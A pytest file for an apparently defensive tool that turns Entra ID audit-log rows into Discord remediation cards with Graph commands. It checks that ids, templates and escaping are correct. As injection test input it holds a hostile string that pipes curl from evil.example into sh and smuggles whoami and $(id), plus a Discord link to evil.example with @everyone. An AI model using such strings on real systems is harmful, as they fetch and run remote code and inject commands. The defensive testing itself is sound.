"""C2b (#607): the identity cards of Glorfindel (C2's rules on Entra ID) — complete commands in
« Prochaines étapes », a consent said in one line.

Seen on the bench (06/11), cards right otherwise: `…/roleAssignments//<id>`,
`…/oauth2PermissionGrants//<id>`, `…/servicePrincipals//<id>/appRoleAssignedTo/<id>` — Discord
read the steps as prose, made each URL a link and showed the backslash of an escape as a `/`; and
the consent's card showed `Permissions : [] => [[Id: …, ClientId: …]]`, raw.

What is held, on rows forged after AuditLogs (`_audit` builds the record as Entra writes it,
`_project` projects it as the shipped rule does):
  - no command of a card ever holds an empty id (`//`, a segment ending on `/`): an id the row
    or Graph gives, else a template that says what to replace, inert in a shell;
  - Graph not read (H0 today), what the row names fills the command: the grants a « Consent to
    application » added (their ids in ConsentAction.Permissions), the resource of an app role
    assignment (its target), the member of a role;
  - Discord shows each command as code, whole — never as prose a link can cut;
  - a consent says the permission, the application, its nature (delegated or application) and
    for whom, in one line; the raw diff never reaches the card.
IR1a (the plan, its checks, « Verify ») is test_identity_plan.py's. Placeholders, never real ids.
"""
from __future__ import annotations

import json
import re
from datetime import datetime, timezone

import pytest

from glorfindel.providers.azure import entra, entra_consent, entra_plan
from glorfindel.providers.azure.entra_items import placeholder
from glorfindel.providers.azure.graph import NoGraph
from tests.unit.fake_graph import FakeGraph

SP = "00000000-0000-0000-0000-0000000000c2"            # the client application's principal
RES = "00000000-0000-0000-0000-0000000000e1"           # the resource's principal (Microsoft Graph's)
ADMIN = "00000000-0000-0000-0000-0000000000b1"
USER = "00000000-0000-0000-0000-0000000000d1"
ROLE_DEF = "00000000-0000-0000-0000-0000000000e9"
GRANT = "Hk-GJ6R6pU6XhsZS2Li6aaVvlMv7Kh1Gv0rB0lyiZ3E"
OTHER_GRANT = "Zz-GJ6R6pU6XhsZS2Li6aaVvlMv7Kh1Gv0rB0lyiZ3E"
ASSIGNMENT = "lAPpYvVpN0KRkAEhdxReEJC2sEqbR_9Hr48lds9SGHI-1"   # a `_`: escaped as prose, it broke the URL
AT = "2026-11-06T10:00:00Z"
NOW = datetime(2026, 11, 6, 10, 30, tzinfo=timezone.utc)
NO_GRAPH = NoGraph("droit absent sur Graph (403)")
HOSTILE = "x'; curl https://evil.example/x | sh; echo `whoami` $(id) <img src=x>"


def _grant_text(gid=GRANT, client=SP, principal="", ctype="AllPrincipals", scope="User.Read offline_access"):
    """One grant as ConsentAction.Permissions writes it (the bench, 06/11)."""
    return (f"[Id: {gid}, ClientId: {client}, PrincipalId: {principal}, ResourceId: {RES}, "
            f"ConsentType: {ctype}, Scope: {scope}, CreatedDateTime: , LastModifiedDateTime ]")


def _permissions(new: list[str], old: list[str] | None = None) -> str:
    return f"[{', '.join(old or [])}] => [{', '.join(new)}]; "


def _audit(op, target: dict, props: dict, category="ApplicationManagement") -> dict:
    """A record of AuditLogs: each modified property's newValue a JSON string, as Entra writes it."""
    target = {**target, "modifiedProperties": [
        {"displayName": k, "oldValue": None, "newValue": json.dumps(v)} for k, v in props.items()]}
    return {"TimeGenerated": AT, "OperationName": op, "Category": category, "Result": "success",
            "CorrelationId": "c-1",
            "InitiatedBy": {"user": {"userPrincipalName": "admin@example.org", "id": ADMIN,
                                     "ipAddress": "203.0.113.7"}},
            "TargetResources": [target]}


def _project(rec: dict) -> dict:
    """The row the shipped rule `entra-app-consent` projects from a record (its `project`)."""
    target = rec["TargetResources"][0]
    props = {p["displayName"]: str(p["newValue"]).strip('"') for p in target["modifiedProperties"]}
    user = rec["InitiatedBy"]["user"]
    perms = props.get("ConsentAction.Permissions") or props.get("AppRole.Value") or \
        props.get("DelegatedPermissionGrant.Scope") or ""
    return {"TimeGenerated": rec["TimeGenerated"], "EntraKind": "consent", "EntraOperation": rec["OperationName"],
            "EventId": rec["CorrelationId"], "Result": rec["Result"], "ActorName": user["userPrincipalName"],
            "ActorId": user["id"], "ActorAppId": "", "ActorIp": user["ipAddress"],
            "TargetName": target.get("displayName", ""), "TargetId": target.get("id", ""),
            "TargetType": target.get("type", ""), "Permissions": perms.strip('"'),
            "AdminConsent": "True" in props.get("ConsentContext.IsAdminConsent", ""),
            "AppOnly": props.get("ConsentContext.IsAppOnly", ""),
            "ClientId": props.get("ServicePrincipal.ObjectID", ""), "CorrelationId": rec["CorrelationId"]}


def _consent(permissions=None, admin=True, app_only="False", **extra) -> dict:
    props = {"ConsentContext.IsAdminConsent": str(admin), "ConsentContext.IsAppOnly": app_only,
             "ConsentAction.Permissions": permissions if permissions is not None else _permissions([_grant_text()])}
    row = _project(_audit("Consent to application",
                          {"id": SP, "displayName": "app-mail-reader", "type": "ServicePrincipal"}, props))
    row.update(extra)
    return row


def _app_role(value="Mail.Read") -> dict:
    return _project(_audit("Add app role assignment to service principal",
                           {"id": RES, "displayName": "Microsoft Graph", "type": "ServicePrincipal"},
                           {"AppRole.Value": value, "ServicePrincipal.ObjectID": SP}))


def _delegated_grant() -> dict:
    return _project(_audit("Add delegated permission grant",
                           {"id": RES, "displayName": "Microsoft Graph", "type": "ServicePrincipal"},
                           {"DelegatedPermissionGrant.Scope": " Mail.Read", "ServicePrincipal.ObjectID": SP}))


def _role(op="Add member to role", **extra) -> dict:
    row = {"TimeGenerated": AT, "EntraKind": "role", "EntraOperation": op, "Result": "success",
           "CorrelationId": "c-1", "RoleName": "Global Administrator", "ActorName": "admin@example.org",
           "ActorId": ADMIN, "ActorAppId": "", "ActorIp": "203.0.113.7", "TargetName": "new-admin@example.org",
           "TargetId": USER, "TargetType": "User"}
    row.update(extra)
    return row


def _credential(**extra) -> dict:
    row = {"TimeGenerated": AT, "EntraKind": "credential", "Result": "success", "CorrelationId": "c-1",
           "EntraOperation": "Update application – Certificates and secrets management ",
           "ActorName": "admin@example.org", "ActorId": ADMIN, "ActorAppId": "", "ActorIp": "203.0.113.7",
           "TargetName": "app-billing", "TargetId": SP, "TargetType": "ServicePrincipal",
           "CredentialAdded": '["[KeyType=Password,KeyUsage=Verify,DisplayName=ci]"]'}
    row.update(extra)
    return row


@pytest.fixture()
def tenant():
    g = FakeGraph()
    g.sps[SP] = {"id": SP, "appId": SP, "displayName": "app-mail-reader", "accountEnabled": True,
                 "passwordCredentials": [], "keyCredentials": []}
    g.users[USER] = {"id": USER, "signInSessionsValidFromDateTime": "2026-10-01T00:00:00Z"}
    g.users[ADMIN] = {"id": ADMIN, "signInSessionsValidFromDateTime": "2026-10-01T00:00:00Z"}
    g.grants.append({"id": GRANT, "clientId": SP, "consentType": "AllPrincipals", "principalId": None,
                     "resourceId": RES, "scope": "User.Read offline_access"})
    g.app_roles[SP] = []
    g.roles[ROLE_DEF] = "Global Administrator"
    g.role_assignments.append({"id": ASSIGNMENT, "principalId": USER, "roleDefinitionId": ROLE_DEF,
                               "directoryScopeId": "/"})
    return g


def _plan(row, reader):
    return entra_plan.build(row, reader, now=NOW)


def _commands(plan) -> list[str]:
    return [c for i in plan["items"] for c in (i["command"], i["find"], i["before"], i["rollback"]) if c]


# An empty id in a URL: two slashes (not the scheme's), or a segment ending before a space, a quote, the end.
_EMPTY_ID = re.compile(r"(?<!https:)//|[A-Za-z]/(?=[\s'\"]|$)")

ROWS = {
    "consent": _consent, "consent (user)": lambda: _consent(admin=False, permissions=_permissions(
        [_grant_text(principal=ADMIN, ctype="Principal")])),
    "consent (app only)": lambda: _consent(permissions="[] => []; ", app_only="True"),
    "app role": _app_role, "delegated grant": _delegated_grant,
    "role": _role, "role (eligible)": lambda: _role("Add eligible member to role"),
    "role (scoped)": lambda: _role("Add scoped member to role"),
    "role (no name)": lambda: _role(RoleName=""),
    "credential": _credential,
}


# ── 1. No command with an empty id: the id, else a template that says what to replace ─────────

@pytest.mark.parametrize("read", ["graph", "no graph"])
@pytest.mark.parametrize("kind", list(ROWS))
def test_no_command_on_an_identity_card_holds_an_empty_id(tenant, kind, read):
    plan = _plan(ROWS[kind](), tenant if read == "graph" else NO_GRAPH)
    assert plan["items"]
    for cmd in _commands(plan):
        assert not _EMPTY_ID.search(cmd), cmd
    for i in plan["items"]:
        for p in i["params"]:
            if not p["read"] and i["command"]:
                # its template, in the command or in the command's place (an eligibility's request)
                assert placeholder(p["name"]) in i["command"] + i["find"], (p, i["command"])
        if i["command"] and all(p["read"] for p in i["params"]):
            assert "<" not in i["command"], i["command"]          # complete: no template left


def test_a_template_says_what_to_replace_and_is_inert_in_a_shell():
    assert placeholder("id de l'octroi") == "<id-de-l-octroi>"
    assert placeholder("id de la définition du rôle") == "<id-de-la-definition-du-role>"
    assert placeholder("keyId") == "<keyId>" and placeholder("") == "<valeur>"
    for name in ("id de l'attribution", "portée du rôle", "id du membre"):
        ph = placeholder(name)
        assert re.fullmatch(r"<[A-Za-z0-9-]+>", ph), ph          # no space, no quote: pasted, the shell refuses `<`
    text = " ".join(entra_plan.steps_text(_plan(_role(), NO_GRAPH)))
    assert "roleAssignments/<id-de-l-attribution>" in text
    assert "à mettre à la place de <id-de-l-attribution>" in text


def test_the_role_card_reported_on_the_bench_no_graph():
    """`…/roleAssignments//<id>` (06/11): the template, and the command that finds the id, complete
    with the member the row names."""
    remove = _plan(_role(), NO_GRAPH)["items"][0]
    assert remove["command"].endswith("/roleManagement/directory/roleAssignments/<id-de-l-attribution>")
    assert not remove["complete"]
    assert f"principalId%20eq%20'{USER}'" in remove["find"]


def test_an_eligible_role_never_read_is_removed_by_a_schedule_request_not_a_delete():
    """An eligibility is no assignment: its template is the request that removes it."""
    remove = _plan(_role("Add eligible member to role"), NO_GRAPH)["items"][0]
    assert "roleEligibilityScheduleRequests" in remove["command"] and "--method DELETE" not in remove["command"]
    assert f'"principalId":"{USER}"' in remove["command"]
    assert '"roleDefinitionId":"<id-de-la-definition-du-role>"' in remove["command"]
    assert '"directoryScopeId":"<portee-du-role>"' in remove["command"]
    assert "roleEligibilitySchedules" in remove["find"] and not remove["complete"]


# ── 2. Graph not read: what the row names fills the command ────────────────────────────────

def test_graph_unread_a_consents_grant_is_removed_by_the_id_its_log_gives():
    plan = _plan(_consent(), NO_GRAPH)
    grant = next(i for i in plan["items"] if (i["check"] or {}).get("kind") == "grant_gone")
    assert grant["command"] == f"az rest --method DELETE --url https://graph.microsoft.com/v1.0/oauth2PermissionGrants/{GRANT}"
    assert grant["complete"] and grant["params"][0]["from"] == "log"
    assert "non confirmé dans Graph" in grant["params"][0]["note"]
    assert grant["check"] == {"kind": "grant_gone", "client": SP, "grant_id": GRANT}
    assert (f'"clientId":"{SP}","consentType":"AllPrincipals","principalId":null,"resourceId":"{RES}",'
            '"scope":"User.Read offline_access"') in grant["rollback"]
    assert "pour tout le tenant" in grant["what"]
    # the application permissions of the same consent: said, to look for
    assert any("permissions d'application" in i["what"] and f"servicePrincipals/{SP}/appRoleAssignments" in i["find"]
               for i in plan["items"])


VICTIM = "VICTIMgrantid000"            # another application's grant, named by a forged line


def _grant_template(plan) -> dict:
    return next(i for i in plan["items"] if "oauth2PermissionGrants/" in i["command"])


def test_a_scope_that_closes_its_entry_never_forges_a_second_grant():
    """A `]` in a scope closed the entry, and the `[Id: …]` after it became a grant of its own: a
    complete DELETE on another application's grant (the 5.5 review). The diff is read only in
    Entra's canonical form, whole: here, nothing of it is read."""
    forged = (f"[Id: {GRANT}, ClientId: {SP}, PrincipalId: , ResourceId: {RES}, ConsentType: AllPrincipals, "
              f"Scope: User.Read] [Id: {VICTIM}, ClientId: {SP}, PrincipalId: , ResourceId: {RES}, "
              "ConsentType: AllPrincipals, Scope: Mail.Read, CreatedDateTime: , LastModifiedDateTime ]")
    row = _consent(permissions=_permissions([forged]))
    assert entra_consent.parse(row["Permissions"]) == {"grants": [], "words": "", "format": "unknown"}
    plan = _plan(row, NO_GRAPH)
    assert not any(VICTIM in c or GRANT in c for c in _commands(plan))
    grant = _grant_template(plan)
    assert grant["command"].endswith("/oauth2PermissionGrants/<id-de-l-octroi>") and not grant["complete"]
    assert "non lue (format du journal non reconnu" in entra.describe(row, plan)[0]


def test_a_grant_the_log_gives_to_another_application_is_never_removed():
    other = "00000000-0000-0000-0000-0000000000f9"
    plan = _plan(_consent(permissions=_permissions([_grant_text(gid=VICTIM, client=other)])), NO_GRAPH)
    assert not any(VICTIM in c for c in _commands(plan))
    assert _grant_template(plan)["command"].endswith("<id-de-l-octroi>")


def test_a_widened_scope_that_is_no_words_is_said_unread_never_unchanged():
    """Before `User.Read`, after `User.Read Mail.Read;x`: not skipped as « unchanged »."""
    perms = _permissions([_grant_text(scope="User.Read Mail.Read;x")], [_grant_text(scope="User.Read")])
    row = _consent(permissions=perms)
    assert entra_consent.parse(perms)["format"] == "unknown"
    assert "non lue (format du journal non reconnu" in entra_consent.line(row)
    assert "non nommée" not in entra_consent.line(row)


def test_without_graph_verify_never_says_held_while_an_application_permission_stands(tenant):
    """The log names only the delegated grants: the review of the application permissions is
    checked too (`consent_gone`) — the card is not « held » while one stands (IR1a's Verify)."""
    from glorfindel.providers.azure import entra_check
    plan = _plan(_consent(), NO_GRAPH)
    review = next(i for i in plan["items"] if "permissions d'application" in i["what"])
    assert review["check"] == {"kind": "consent_gone", "client": SP}
    tenant.sps[SP]["accountEnabled"] = False                 # the gestures made…
    tenant.grants.clear()
    tenant.users[ADMIN]["signInSessionsValidFromDateTime"] = "2026-11-06T10:05:00Z"
    tenant.app_roles[SP] = [{"id": "ar-1", "principalId": SP, "resourceId": RES,
                             "appRoleId": "00000000-0000-0000-0000-0000000000a9"}]
    out = entra_check.verify(plan, tenant, now=NOW)          # …but an application permission stands
    assert out["verdict"] == "not_held"
    tenant.app_roles[SP] = []
    assert entra_check.verify(plan, tenant, now=NOW)["verdict"] == "held"


def test_a_widened_grant_is_one_grant_and_an_unchanged_one_none():
    old = [_grant_text(scope="User.Read"), _grant_text(gid=OTHER_GRANT, scope="openid")]
    new = [_grant_text(scope="User.Read Mail.Read"), _grant_text(gid=OTHER_GRANT, scope="openid")]
    parsed = entra_consent.parse(_consent(permissions=_permissions(new, old))["Permissions"])
    assert [(g["id"], g["added"], g["scope"]) for g in parsed["grants"]] == [(GRANT, "Mail.Read", "User.Read Mail.Read")]
    assert "« Mail.Read »" in entra_consent.line(_consent(permissions=_permissions(new, old)))


def test_graph_unread_an_app_role_is_removed_on_the_resource_its_target_names():
    """`…/servicePrincipals//<id>/appRoleAssignedTo/<id>` (06/11): the resource is the row's target."""
    plan = _plan(_app_role(), NO_GRAPH)
    role = next(i for i in plan["items"] if "appRoleAssignedTo" in i["command"])
    assert role["command"] == ("az rest --method DELETE --url https://graph.microsoft.com/v1.0/servicePrincipals/"
                               f"{RES}/appRoleAssignedTo/<id-de-l-attribution>")
    assert role["find"] == f"az rest --method GET --url https://graph.microsoft.com/v1.0/servicePrincipals/{SP}/appRoleAssignments"
    assert "(Mail.Read)" in role["what"] and not role["complete"]
    # the client, never the resource, blocked (IR1a)
    assert not any(f"--id {RES}" in c for c in _commands(plan))


def test_graph_read_wins_over_the_log(tenant):
    """Graph read, the grants are Graph's (IR1a); the log's only fill what Graph did not answer."""
    plan = _plan(_consent(permissions=_permissions([_grant_text(gid=OTHER_GRANT)])), tenant)
    grants = [i for i in plan["items"] if (i["check"] or {}).get("kind") == "grant_gone"]
    assert [g["params"][0]["value"] for g in grants] == [GRANT] and grants[0]["params"][0]["from"] == "graph"


@pytest.mark.parametrize("field", ["Id", "ClientId", "ResourceId", "Scope"])
def test_a_hostile_value_in_the_logs_permissions_never_reaches_a_command(field):
    fields = {"Id": GRANT, "ClientId": SP, "ResourceId": RES, "Scope": "User.Read"}
    fields[field] = HOSTILE.replace(",", " ")
    text = "[] => [[" + ", ".join(f"{k}: {v}" for k, v in fields.items()) + ", ConsentType: AllPrincipals]]; "
    plan = _plan(_consent(permissions=text), NO_GRAPH)
    for cmd in _commands(plan):
        assert not re.search(r"evil|curl|whoami|\$\(|`|<img", cmd), cmd
    what = entra.describe(_consent(permissions=text), plan)[0]
    assert "evil" not in what or field == "Scope" and "portée non reprise" in what


# ── 3. Discord: each command as code, whole ────────────────────────────────────────────────

def _card(row, reader):
    plan = _plan(row, reader)
    what, steps = entra.describe(row, plan)
    return {"id": "e5c0ffee-0001", "action": "", "escalation_type": "identity_change",
            "resource_id": "/subscriptions/s/resourceGroups/rg/providers/Microsoft.Compute/virtualMachines/vm-x",
            "reason": what, "explanation": what, "suggested_steps": steps, "identity_plan": plan,
            "run_id": "watch-1", "ttp": "T1098.003", "severity": "high", "rule_name": "entra-privileged-role-assigned"}


def _fields(esc) -> list[str]:
    from glorfindel import bot
    _, fields = bot._embed_body(esc)
    return [v for n, v, _ in fields if n.startswith("Prochaines étapes")]


def _field(esc) -> str:
    """The plan's fields, each within Discord's 1024 characters, as one text."""
    values = _fields(esc)
    assert 1 <= len(values) <= 2 and all(len(v) <= 1024 for v in values), [len(v) for v in values]
    return "\n".join(values)


def _unescaped(text: str, chars: str) -> list[str]:
    out, i = [], 0
    while i < len(text):
        if text[i] == "\\":
            i += 2
            continue
        if text[i] in chars:
            out.append(text[i])
        i += 1
    return out


@pytest.mark.parametrize("read", ["graph", "no graph"])
@pytest.mark.parametrize("kind", ["role", "consent", "app role", "role (eligible)"])
def test_discord_shows_each_command_as_code_whole(tenant, kind, read):
    pytest.importorskip("discord")
    esc = _card(ROWS[kind](), tenant if read == "graph" else NO_GRAPH)
    value = _field(esc)
    spans = re.findall(r"(?<!\\)`([^`\n]*)`", value)
    shown = [i for i in esc["identity_plan"]["items"] if i["command"]]          # every one: they fit
    for i in shown:
        assert i["command"] in spans, (i["command"], value)          # verbatim: no backslash, no link
    for s in spans:
        assert "\\" not in s.replace("\\$", "") and not _EMPTY_ID.search(s), s
    if kind == "role" and read == "graph":
        assert f"roleAssignments/{ASSIGNMENT}" in spans[0]
    # the rest, prose: escaped as every text from outside
    prose = re.sub(r"(?<!\\)`[^`\n]*`", "", value)
    assert _unescaped(prose, "[]()<>*_~|`") == [], prose


def test_discord_prose_from_outside_stays_inert_around_the_commands(tenant):
    pytest.importorskip("discord")
    hostile = "[Support](https://evil.example) @everyone `x` <@&1>"
    value = _field(_card(_role(RoleName="Global Administrator", TargetName=hostile, ActorName=hostile), tenant))
    prose = re.sub(r"(?<!\\)`[^`\n]*`", "", value)
    assert _unescaped(prose, "[]()<>*_~|`") == [] and "@everyone" not in value


def test_discord_says_what_does_not_fit(tenant):
    pytest.importorskip("discord")
    esc = _card(_role(), tenant)
    esc["identity_plan"]["items"] = esc["identity_plan"]["items"] * 6
    value = _field(esc)
    assert value.endswith("la carte dans la console") and len(_fields(esc)) == 2
    assert all(v.count("`") % 2 == 0 for v in _fields(esc))           # no code span cut


def test_a_card_without_its_plan_keeps_its_steps_escaped_whole():
    """An older card (before IR1a) or another type: its steps as prose, as SEC6 wants."""
    pytest.importorskip("discord")
    value = _field({"action": "", "escalation_type": "identity_change", "resource_id": "/x/vm",
                    "suggested_steps": ["`az rest --url https://graph.microsoft.com/v1.0/x/<id>`"]})
    assert _unescaped(value, "<>`") == []


# ── 4. A consent in one line: the permission, the application, its nature, for whom ───────────

@pytest.mark.parametrize("row, expected", [
    (lambda: _consent(),
     f"Permission déléguée « User.Read offline_access » accordée à l'application app-mail-reader ({SP}) "
     f"sur la ressource {RES}, pour tous les utilisateurs du tenant."),
    (lambda: _consent(admin=False, permissions=_permissions([_grant_text(principal=ADMIN, ctype="Principal")])),
     f"Permission déléguée « User.Read offline_access » accordée à l'application app-mail-reader ({SP}) "
     f"sur la ressource {RES}, pour l'utilisateur {ADMIN} seulement."),
    (_app_role,
     f"Permission d'application « Mail.Read » accordée à l'application {SP} sur Microsoft Graph ({RES}), "
     "sans utilisateur : l'application agit en son propre nom, sur tout le tenant."),
    (_delegated_grant,
     f"Permission déléguée « Mail.Read » accordée à l'application {SP} sur Microsoft Graph ({RES}), "
     "pour qui : non lu."),
    (lambda: _consent(permissions="[] => []; ", app_only="True"),
     f"Permission d'application non nommée par le journal accordée à l'application app-mail-reader ({SP}), "
     "sans utilisateur : l'application agit en son propre nom, sur tout le tenant."),
    (lambda: _consent(permissions="Mail.Read", app_only=""),
     f"Permission (déléguée ou d'application : non lu) « Mail.Read » accordée à l'application app-mail-reader "
     f"({SP}), pour tous les utilisateurs du tenant."),
])
def test_a_consent_says_in_one_line_the_permission_the_application_its_nature_and_for_whom(row, expected):
    r = row()
    assert entra_consent.line(r) == expected
    assert expected in entra.describe(r)[0]


@pytest.mark.parametrize("permissions", [
    _permissions([_grant_text()]),
    _permissions([_grant_text(scope="User.Read Mail.Read")], [_grant_text(scope="User.Read")]),
    "[] => [[Id: ???]]",                     # unknown: said, never shown raw
    "{\"weird\": true}",
])
def test_the_raw_diff_never_reaches_the_card(permissions):
    what, steps = entra.describe(_consent(permissions=permissions))
    for text in [what] + steps:
        assert "=>" not in text and "ClientId:" not in text and "[[" not in text and "weird" not in text, text
    if "???" in permissions or "weird" in permissions:
        assert "non lue (format du journal non reconnu" in what


def test_the_shipped_rule_projects_what_the_line_reads():
    from pathlib import Path

    import yaml
    shipped = Path(entra.__file__).resolve().parents[2] / "rules" / "azure" / "detection_rules.yaml"
    query = next(r for r in yaml.safe_load(shipped.read_text())["rules"] if r["name"] == "entra-app-consent")["query"]
    assert '"ConsentContext.IsAppOnly"' in query and "AppOnly = trim(@'\"', tostring(Props[\"ConsentContext.IsAppOnly\"]))" in query
    assert "Permissions = trim(@'\"', coalesce(tostring(Props[\"ConsentAction.Permissions\"])" in query
